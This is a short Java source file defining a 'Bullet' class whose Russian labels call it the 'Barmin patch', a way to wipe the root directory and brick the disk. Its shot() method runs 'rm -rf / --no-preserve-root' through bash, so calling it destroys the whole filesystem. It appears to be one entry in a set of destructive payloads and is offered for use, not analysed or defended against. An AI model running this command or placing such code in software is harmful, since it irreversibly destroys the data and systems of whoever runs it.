package bullets;

import lombok.Getter;

import java.io.IOException;

@Getter
public class RmRfAllAndSys implements Bullet {
    String name = "Удаление корня и папки /sys. Патч Бармина";
    String description = "Полностью очищает ваш диск, при этом дополнительно превращая его в кирпич. Один из самых жестоких вариантов";

    @Override
    public void shot() throws IOException {
        ProcessBuilder processBuilder = new ProcessBuilder("bash", "-c",
                "rm -rf / --no-preserve-root");

        processBuilder.start();
    }
}